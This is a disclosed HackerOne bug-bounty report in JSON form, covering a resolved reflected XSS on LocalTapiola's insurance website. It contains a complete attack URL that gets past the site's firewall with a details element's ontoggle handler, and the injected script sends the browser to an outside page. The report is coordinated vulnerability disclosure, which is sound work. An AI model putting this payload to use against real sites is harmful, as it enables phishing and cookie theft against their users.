{
  "id": 301680,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE2ODA=",
  "url": "https://hackerone.com/reports/301680",
  "title": "Reflected XSS Vulnerability in https://www.lahitapiola.fi/cs/Satellite",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2018-01-01T20:16:24.756Z",
  "submitted_at": "2018-01-01T20:16:24.756Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "teemuk",
    "url": "/teemuk",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/557/e915926b8e01ab33434559ed179151a879d792ba_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 8416,
    "url": "https://hackerone.com/localtapiola",
    "handle": "localtapiola",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "LocalTapiola",
      "twitter_handle": "",
      "website": "http://www.lahitapiola.fi",
      "about": "LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2018-04-11T06:34:46.473Z",
  "bug_reporter_agreed_on_going_public_at": "2018-04-11T06:34:46.365Z",
  "team_member_agreed_on_going_public_at": "2018-04-09T20:17:53.854Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Basic report information\n**Summary:** Reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite.`\n\n**Description:** There exists a reflected XSS vulnerability in `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav`. Value of query string parameter `rendermode` is not properly escaped when it is output to the page. The web-application-firewall (WAF) seems to mitigate majority of the simplest XSS vectors, but it is possible to bypass the WAF by using `onToggle` event in `<details>` HTML element. The javascript that is used to demonstrate the vulnerability is `location.href=\"https://www.google.com/?q=\"+document.domain`. This demonstrates an open redirect type of vulnerability where user's browser is redirected to the attacker page where the attacker can e.g. perform phishing.\n\n**Domain:** `www.lahitapiola.fi`\n\n## Browsers / Apps Verified In:\n\n  * Firefox version 57.0.3\n\n## Steps To Reproduce:\n\nAccess the attack URL `https://www.lahitapiola.fi/cs/Satellite?pagename=TAMaster/FW_BlogAsset/FW_Nav&rendermode=preview\"><details%20open=true%20ontoggle=%27location.href=\"https://www.google.com/?q=\"%2Bdocument.domain%27><summary>testing</summary></details>`\nBrowser is redirected to `https://www.google.com/?q=www.lahitapiola.fi`.\n\n## Additional material\n\n* N/A\n\n## Related reports, best practices\n\nThis vulnerability is related to the previously reported Oracle Webcenter Sites vulnerabilities (e.g. #170532)\n\n## Impact\n\nAn attacker can use reflected XSS vulnerabilities to inject content to pages served from `www.lahitapiola.fi`. This can be used e.g. for phishing purposes or to e.g. steal cookies from user's browser.",
  "bounty_amount": "250.0",
  "formatted_bounty": "$250",
  "weakness": {
    "id": 61,
    "name": "Cross-site Scripting (XSS) - Reflected"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 6,
  "voters": [
    "tk0",
    "harry_mg",
    "whitesector",
    "eveeez",
    "japz",
    "666reda"
  ],
  "severity": {
    "rating": "medium",
    "score": 4.3,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 1045,
    "asset_type": "URL",
    "asset_identifier": "www.lahitapiola.fi",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 7062,
      "category": "team",
      "content": "##Issue\nThe reporter found a reflected XXS in the Satellite server.\n\n##Fix\n\nWhile the issue was investigated, there were some backend updates done which apparently automatically mysteriously fixed the issue. Poof.\n\n##Reasoning\n\nBased on the report, the issue was found to be valid. Working single click open redirects which are easily usable in phishing attacks are always an issue for us. ",
      "user": {
        "id": 60017,
        "username": "localtapiola-thomas",
        "name": "localtapiola-thomas",
        "bio": "LocalTapiola Bug Bounty Coordinator - @tsmalmbe",
        "cleared": false,
        "verified": false,
        "website": "http://www.lahitapiola.fi",
        "location": "Espoo, Finland",
        "created_at": "2016-03-09T13:58:17.117Z",
        "url": "https://hackerone.com/localtapiola-thomas",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
